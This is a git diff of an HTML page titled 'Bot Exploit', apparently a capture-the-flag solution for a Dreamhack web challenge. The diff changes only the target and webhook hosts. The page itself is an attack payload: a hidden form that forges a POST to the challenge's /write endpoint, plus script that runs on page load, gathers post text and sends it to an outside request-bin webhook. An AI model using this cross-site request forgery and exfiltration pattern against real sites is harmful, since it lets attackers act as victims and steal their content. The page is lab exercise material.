@@ -5,7 +5,7 @@
   <title>Bot Exploit</title>
 </head>
 <body>
-<form id="botForm" method="POST" action="https://host8.dreamhack.games:21117/write">
+<form id="botForm" method="POST" action="http://host1.dreamhack.games:19792/write">
   <input type="hidden" name="content" value="FLAG_REQUEST">
   <input type="hidden" name="isHidden" value="true">
   <input type="hidden" name="csrf_token" value="{{ session.csrf_token }}">
@@ -21,7 +21,7 @@ document.addEventListener('DOMContentLoaded', function() {
     setTimeout(function(){
         const posts = document.querySelectorAll('.post-content');
         posts.forEach(post => {
-            fetch("https://uqgiods.request.dreamhack.games/webhook", {
+            fetch("https://egxmzce.request.dreamhack.games/webhook", {
                 method: "POST",
                 headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({content: post.innerText})
